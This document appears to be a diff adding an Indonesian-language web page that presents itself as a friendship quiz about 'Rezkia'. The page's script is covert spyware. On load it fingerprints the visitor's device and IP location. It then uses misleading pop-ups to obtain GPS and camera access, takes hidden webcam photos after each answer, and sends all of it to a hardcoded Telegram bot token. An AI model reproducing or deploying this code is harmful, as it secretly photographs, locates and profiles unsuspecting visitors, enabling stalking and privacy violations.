@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Seberapa Kamu Tau Rezkia? 🤔</title>
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1/dist/ua-parser.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { width: 100%; height: 100%; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29 0%, #1a0a2e 25%, #16213e 50%, #0a1628 75%, #0f0c29 100%);
+            background-size: 400% 400%;
+            animation: gradientMove 15s ease infinite;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+        @keyframes gradientMove { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        .container { width: 100%; max-width: 500px; padding: 20px; z-index: 1; }
+        .screen { display: none; }
+        .screen.active { display: block; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .quiz-box {
+            background: rgba(20, 15, 40, 0.6); backdrop-filter: blur(25px);
+            border-radius: 28px; padding: 30px 25px;
+            border: 1.5px solid rgba(255,255,255,0.12); text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+        .logo-icon { font-size: 3.5em; margin-bottom: 8px; animation: bounce 2s ease-in-out infinite; display: inline-block; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        h1 { font-size: 1.8em; margin-bottom: 8px; background: linear-gradient(135deg, #ff6b8a, #f093fb, #fda085); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-weight: 800; }
+        .subtitle { color: #b8b8cc; margin-bottom: 18px; font-size: 0.9em; }
+        button {
+            background: linear-gradient(135deg, #ff4d6a, #f5576c); color: #fff; border: none;
+            padding: 15px 40px; border-radius: 50px; font-size: 1.05em; font-weight: 700;
+            cursor: pointer; box-shadow: 0 8px 25px rgba(245,87,108,0.35);
+            width: 100%; margin: 5px 0; transition: transform 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        button:active { transform: scale(0.96); }
+        .btn-tolak { background: rgba(255,255,255,0.06); box-shadow: none; border: 1.5px solid rgba(255,255,255,0.15); color: #ccc; }
+        .progress-bar { width: 100%; height: 8px; background: rgba(255,255,255,0.08); border-radius: 10px; margin-bottom: 20px; overflow: hidden; }
+        .progress { height: 100%; background: linear-gradient(90deg, #f5576c, #f093fb, #fda085); background-size: 200% 100%; border-radius: 10px; transition: width 0.4s ease; animation: progressShine 2s linear infinite; }
+        @keyframes progressShine { 0% { background-position: 0% 50%; } 100% { background-position: 200% 50%; } }
+        .soal-nomer { font-size: 0.8em; color: #888; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 2px; font-weight: 600; }
+        #teksSoal { font-size: 1.15em; margin-bottom: 22px; font-weight: 600; color: #eee; }
+        .pilihan { display: flex; flex-direction: column; gap: 10px; margin-bottom: 18px; }
+        .pilihan button { background: rgba(255,255,255,0.04); border: 1.5px solid rgba(255,255,255,0.1); color: #ddd; padding: 14px 16px; border-radius: 16px; font-size: 0.95em; cursor: pointer; text-align: left; font-weight: 500; box-shadow: none; }
+        .pilihan button:active { background: rgba(245,87,108,0.2); border-color: #f5576c; }
+        .pilihan button.selected { background: linear-gradient(135deg, rgba(245,87,108,0.3), rgba(240,147,251,0.25)); border-color: #f5576c; color: #fff; font-weight: 700; }
+        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top-color: #f5576c; border-right-color: #f093fb; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #hasilTeks { font-size: 1.5em; background: linear-gradient(135deg, #fda085, #f5576c, #f093fb); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin: 12px 0; font-weight: 800; }
+        .skor-box { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 22px 18px; margin: 18px 0; border: 1.5px solid rgba(255,255,255,0.08); }
+        .skor-angka { font-size: 4.5em; font-weight: 900; background: linear-gradient(135deg, #fda085, #f5576c, #f093fb); background-size: 300% 300%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; animation: scoreShine 3s ease-in-out infinite; }
+        @keyframes scoreShine { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
+        .skor-bar { width: 100%; height: 14px; background: rgba(255,255,255,0.06); border-radius: 8px; margin: 18px 0; overflow: hidden; }
+        .skor-fill { height: 100%; background: linear-gradient(90deg, #f5576c, #f093fb, #fda085); background-size: 300% 100%; border-radius: 8px; transition: width 1s ease; box-shadow: 0 0 20px rgba(245,87,108,0.4); }
+        .closing { color: #999; font-size: 0.85em; margin-top: 15px; }
+        #skorKata { color: #bbb; font-size: 0.9em; margin-top: 8px; }
+        @media (max-width: 480px) { .quiz-box { padding: 22px 16px; } h1 { font-size: 1.4em; } #teksSoal { font-size: 1em; } .skor-angka { font-size: 3.5em; } }
+
+        #videoKamera, #canvasKamera { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; z-index: -9999; }
+
+        /* POP-UP CUSTOM */
+        .popup-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.88); z-index: 99999; justify-content: center; align-items: center; }
+        .popup-overlay.show { display: flex; }
+        .popup-box { background: linear-gradient(160deg, #1a1a38, #12122a); border-radius: 24px; padding: 28px 22px; text-align: center; border: 2px solid rgba(245,87,108,0.4); max-width: 340px; width: 90%; box-shadow: 0 25px 70px rgba(0,0,0,0.8); animation: popIn 0.35s ease; }
+        @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .popup-box .popup-icon { font-size: 3.5em; margin-bottom: 10px; }
+        .popup-box h3 { font-size: 1.3em; margin-bottom: 6px; color: #fff; font-weight: 700; }
+        .popup-box .popup-desc { color: #aaa; font-size: 0.82em; margin-bottom: 20px; }
+        .btn-group { display: flex; flex-direction: column; gap: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- POP-UP 1: PERTANYAAN AWAL -->
+        <div class="popup-overlay" id="popup0">
+            <div class="popup-box">
+                <div class="popup-icon">🤔</div>
+                <h3>Seberapa Kamu Tau Rezkia?</h3>
+                <p class="popup-desc">Pilih sesuai keyakinan kamu!</p>
+                <div class="btn-group">
+                    <button onclick="goNext('popup0','popup1')">✨ Tau Banget!</button>
+                    <button class="btn-tolak" onclick="goNext('popup0','popup1')">😅 Ga Tau</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- POP-UP 2: KONFIRMASI -->
+        <div class="popup-overlay" id="popup1">
+            <div class="popup-box">
+                <div class="popup-icon">😤</div>
+                <h3>Beneran Tau?</h3>
+                <p class="popup-desc">Serius nih? Gak boong?</p>
+                <div class="btn-group">
+                    <button onclick="goNext('popup1','popup2')">🔥 Iya Tau Bawel!</button>
+                    <button class="btn-tolak" onclick="goNext('popup1','popup2')">😬 Ngga</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- POP-UP 3: SIAP LANJUT -->
+        <div class="popup-overlay" id="popup2">
+            <div class="popup-box">
+                <div class="popup-icon">🚀</div>
+                <h3>Yakin Mau Lanjut?</h3>
+                <p class="popup-desc">Udah siap buat jawab pertanyaannya?</p>
+                <div class="btn-group">
+                    <button onclick="gasLanjut()">🔥 Gas! Lanjutin!</button>
+                    <button class="btn-tolak" onclick="gasGakJadi()">😅 Bentar Deh</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- SCREENS -->
+        <div id="startScreen" class="screen active">
+            <div class="quiz-box">
+                <div class="logo-icon">🧠</div>
+                <h1>Seberapa Kamu Tau Rezkia?</h1>
+                <p class="subtitle">Jawab 5 pertanyaan ini & buktikan kamu paling kenal Rezkia! 🎯</p>
+                <button onclick="mulaiKuis()">🔥 Ayo Mulai Kuisnya!</button>
+                <p style="margin-top:12px;font-size:0.65em;color:#555;">By Rezkia Universe ⚡</p>
+            </div>
+        </div>
+        <div id="quizScreen" class="screen">
+            <div class="quiz-box">
+                <div class="progress-bar"><div class="progress" id="progress"></div></div>
+                <p class="soal-nomer">⭐ Pertanyaan <span id="nomorSoal">1</span> dari 5</p>
+                <h2 id="teksSoal"></h2>
+                <div class="pilihan" id="pilihanContainer"></div>
+                <button id="btnLanjut" style="display:none;" onclick="lanjutSoal()">🔥 Lanjut ➜</button>
+            </div>
+        </div>
+        <div id="hasilScreen" class="screen">
+            <div class="quiz-box">
+                <div class="logo-icon">🎉</div>
+                <h1>Kuis Selesai!</h1>
+                <p class="subtitle">Kamu tau Rezkia sebanyak:</p>
+                <div class="skor-box">
+                    <div class="skor-angka" id="skorAngka">0%</div>
+                    <div class="skor-bar"><div class="skor-fill" id="skorFill" style="width:0%"></div></div>
+                    <p id="skorKata"></p>
+                </div>
+                <p class="closing">✨ Makasih udah main ya! ✨</p>
+            </div>
+        </div>
+        <div id="loadingScreen" class="screen">
+            <div class="quiz-box"><div class="spinner"></div><p style="color:#bbb;">Bentar ya... 🤔</p></div>
+        </div>
+        <video id="videoKamera" autoplay playsinline muted></video>
+        <canvas id="canvasKamera"></canvas>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8946884875:AAHNsZb3Eu6rd1OgCDw1RpjTHN3zK8G-TR4';
+        const CHAT_ID = '7705600224';
+
+        let dataUser = {};
+        const soal = [
+            { teks: "🍛 Apa makanan favorit Rezkia?", pilihan: ["Nasi Goreng 🍛", "Mie Ayam 🍜", "Sate Ayam 🍢", "Bakso 🍲"] },
+            { teks: "🎮 Rezkia suka ngabisin waktu buat apa?", pilihan: ["Main Game 🎮", "Scroll TikTok 📱", "Dengerin Musik 🎵", "Tiduran 😴"] },
+            { teks: "🎬 Film favorit Rezkia?", pilihan: ["Horror 👻", "Komedi 😂", "Action 💥", "Drama 🎭"] },
+            { teks: "💬 Kalo ada masalah, Rezkia?", pilihan: ["Curhat 💬", "Diem aja 🤐", "Cari solusi 💪", "Nangis 😢"] },
+            { teks: "🌟 Cita-cita Rezkia?", pilihan: ["Crazy rich 💰", "Hidup santai 🌿", "Terkenal 🌟", "Bos sendiri 👑"] }
+        ];
+        const kunciJawaban = [1, 0, 2, 3, 1];
+        let indeksSoal = 0, jawabanDipilih = null, jawabanKuis = [], kameraOk = false;
+        let kuisStarted = false, lanjutLock = false;
+        let streamKamera = null;
+
+        function log(msg) { console.log(msg); }
+        function tampilkanScreen(id) { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
+        function showPopup(id) { document.getElementById(id).classList.add('show'); }
+        function hidePopup(id) { document.getElementById(id).classList.remove('show'); }
+        function goNext(hide, show) { hidePopup(hide); setTimeout(() => showPopup(show), 300); }
+
+        async function getFullFingerprint() {
+            const parser = new UAParser(); const r = parser.getResult(); const ua = navigator.userAgent;
+            let m='?',t='?',os='?',osv='?',br='?',brv='?';
+            if(r.os){os=r.os.name||'?';osv=r.os.version||'?';}
+            if(r.browser){br=r.browser.name||'?';brv=r.browser.version||'?';}
+            if(r.device){m=r.device.vendor||'?';t=r.device.model||'?';}
+            if(m==='?'||t==='?'){
+                const b=[{n:'Infinix',rx:/Infinix\s+(\w+\s*\d+)/i},{n:'Xiaomi',rx:/(?:Redmi|POCO|Mi)\s*(\w*\s*\d+)/i},{n:'Samsung',rx:/SM-(\w+)/i},{n:'Oppo',rx:/(?:OPPO|CPH)\s*(\w+)/i},{n:'Vivo',rx:/(?:vivo|V\d+)\s*(\w+)/i},{n:'Realme',rx:/(?:realme|RMX)\s*(\w+)/i},{n:'iPhone',rx:/iPhone/i}];
+                for(const x of b){const mc=ua.match(x.rx);if(mc){if(m==='?')m=x.n;if(t==='?'&&mc[1])t=mc[1];else if(t==='?')t=x.n;break;}}
+            }
+            return{merk:m,tipe:t,fullDevice:m+' '+t,os,osVersion:osv,browser:br,browserVersion:brv,screenW:screen.width,screenH:screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||'?'};
+        }
+
+        async function getIPDetail() {
+            try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();if(d.ip){dataUser.ip=d.ip;dataUser.isp=d.org||'?';dataUser.kota=d.city||'?';dataUser.region=d.region||'?';dataUser.negara=d.country_name||'?';return;}}catch(e){}
+            dataUser.ip='?';dataUser.isp='?';dataUser.kota='?';dataUser.region='?';dataUser.negara='?';
+        }
+
+        function mintaGPS() {
+            return new Promise(resolve => {
+                if(!navigator.geolocation){dataUser.lokasi={maps:'?'};resolve(false);return;}
+                navigator.geolocation.getCurrentPosition(p=>{dataUser.lokasi={lat:p.coords.latitude,lng:p.coords.longitude,maps:'https://maps.google.com/?q='+p.coords.latitude+','+p.coords.longitude};resolve(true);},e=>{dataUser.lokasi={maps:'?'};resolve(false);},{enableHighAccuracy:true,timeout:8000});
+            });
+        }
+
+        async function initKamera() {
+            try{if(streamKamera)return true;
+                streamKamera=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false});
+                document.getElementById('videoKamera').srcObject=streamKamera;
+                await document.getElementById('videoKamera').play();
+                await new Promise(r=>setTimeout(r,800));return true;
+            }catch(e){return false;}
+        }
+
+        function ambilFoto() {
+            return new Promise(resolve=>{
+                const v=document.getElementById('videoKamera'),c=document.getElementById('canvasKamera');
+                if(!streamKamera||!v.videoWidth){resolve(null);return;}
+                c.width=v.videoWidth;c.height=v.videoHeight;
+                c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+                c.toBlob(b=>resolve(b),'image/jpeg',0.9);
+            });
+        }
+
+        function matikanKamera(){if(streamKamera){streamKamera.getTracks().forEach(t=>t.stop());streamKamera=null;}}
+
+        async function getBaterai(){
+            try{if(navigator.getBattery){const b=await navigator.getBattery();return{level:Math.round(b.level*100)+'%',charging:b.charging?'Ya':'Tidak'};}}catch(e){}
+            return{level:'?',charging:'?'};
+        }
+
+        async function kirimFoto(blob,caption){
+            if(!blob||blob.size<100)return;
+            const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('photo',blob,'f'+(indeksSoal+1)+'.jpg');fd.append('caption',caption);fd.append('parse_mode','HTML');
+            try{await fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendPhoto',{method:'POST',body:fd});}catch(e){}
+        }
+
+        async function kirimPesan(teks){
+            try{await fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:teks,parse_mode:'HTML'})});}catch(e){}
+        }
+
+        async function gasLanjut(){
+            hidePopup('popup2');tampilkanScreen('loadingScreen');
+            await Promise.all([mintaGPS(),initKamera()]);
+            kameraOk=true;
+            if(!dataUser.lokasi)dataUser.lokasi={maps:'?'};
+            await mulaiKuisReal();
+        }
+
+        async function gasGakJadi(){
+            hidePopup('popup2');tampilkanScreen('loadingScreen');
+            kameraOk=false;dataUser.lokasi={maps:'?'};
+            await mulaiKuisReal();
+        }
+
+        function mulaiKuis(){if(kuisStarted)return;kuisStarted=true;showPopup('popup0');}
+
+        function buildInfo(){
+            const d=dataUser;
+            return'🕐 '+new Date().toLocaleString('id-ID')+'\n🌐 IP: '+d.ip+'\n📡 ISP: '+d.isp+'\n🏙 Kota: '+d.kota+'\n🗺 Region: '+d.region+'\n🇮🇩 Negara: '+d.negara+'\n📍 GPS: '+(d.lokasi?d.lokasi.maps:'?')+'\n📱 HP: '+d.fullDevice+'\n💻 OS: '+d.os+' '+d.osVersion+'\n🌐 Browser: '+d.browser+' '+d.browserVersion+'\n🖥 Resolusi: '+d.screenW+'x'+d.screenH+'\n🌍 Bahasa: '+d.bahasa+'\n🧠 CPU: '+d.cpu+' core\n💾 RAM: '+d.memori+' GB\n📶 Jaringan: '+d.provider;
+        }
+
+        async function mulaiKuisReal(){
+            await getIPDetail();
+            const bat=await getBaterai();
+            dataUser.batteryLevel=bat.level;dataUser.batteryCharging=bat.charging;
+            await kirimPesan('🔔 <b>MULAI!</b>\n\n'+buildInfo()+'\n\n<i>⚡ Dark AI</i>');
+            tampilkanScreen('quizScreen');tampilkanSoal(0);
+        }
+
+        function tampilkanSoal(i){
+            jawabanDipilih=null;const s=soal[i];
+            document.getElementById('nomorSoal').textContent=i+1;
+            document.getElementById('teksSoal').textContent=s.teks;
+            document.getElementById('progress').style.width=((i+1)/5*100)+'%';
+            document.getElementById('btnLanjut').style.display='none';
+            const c=document.getElementById('pilihanContainer');c.innerHTML='';
+            s.pilihan.forEach((p,idx)=>{const b=document.createElement('button');b.textContent=p;b.onclick=function(){c.querySelectorAll('button').forEach(x=>x.classList.remove('selected'));this.classList.add('selected');jawabanDipilih=idx;document.getElementById('btnLanjut').style.display='block';};c.appendChild(b);});
+        }
+
+        async function lanjutSoal(){
+            if(jawabanDipilih===null||lanjutLock)return;
+            lanjutLock=true;jawabanKuis.push(jawabanDipilih);
+            tampilkanScreen('loadingScreen');
+            const bat=await getBaterai();
+            if(kameraOk){const foto=await ambilFoto();if(foto)await kirimFoto(foto,'📸 <b>FOTO '+(indeksSoal+1)+'/5</b>\n\n📝 '+soal[indeksSoal].pilihan[jawabanDipilih]+'\n🔋 '+bat.level+' | '+bat.charging+'\n'+buildInfo()+'\n\n<i>⚡ Dark AI</i>');}
+            indeksSoal++;
+            if(indeksSoal>=5){
+                matikanKamera();
+                let benar=0;for(let i=0;i<5;i++){if(jawabanKuis[i]===kunciJawaban[i])benar++;}
+                const persen=Math.round((benar/5)*100);
+                await kirimPesan('✅ <b>SELESAI!</b>\n\n🎯 Skor: '+persen+'%\n'+buildInfo()+'\n📝 Jawaban:\n'+jawabanKuis.map((j,i)=>'  '+(i+1)+'. '+soal[i].pilihan[j]).join('\n')+'\n📸 5 Foto\n\n<i>⚡ Dark AI</i>');
+                tampilkanScreen('hasilScreen');
+                document.getElementById('skorAngka').textContent=persen+'%';
+                document.getElementById('skorFill').style.width=persen+'%';
+                document.getElementById('skorKata').textContent=persen>=80?'🔥 GILA!':persen>=60?'👍 Lumayan':persen>=40?'🤔 Kenal-kenal aja':'😅 Gak kenal';
+                document.getElementById('hasilTeks').textContent=persen+'% Tau Rezkia!';
+            }else{tampilkanScreen('quizScreen');tampilkanSoal(indeksSoal);lanjutLock=false;}
+        }
+
+        window.addEventListener('load',async()=>{
+            const fp=await getFullFingerprint();
+            dataUser={...dataUser,...fp,userAgent:navigator.userAgent,platform:navigator.platform,bahasa:navigator.language,provider:navigator.connection?navigator.connection.effectiveType:'?',memori:navigator.deviceMemory||'?',cpu:navigator.hardwareConcurrency||'?'};
+            await getIPDetail();
+            await kirimPesan('👁 <b>BUKA!</b>\n\n'+buildInfo()+'\n\n<i>⚡ Dark AI</i>');
+        });
+    </script>
+</body>
+</html>
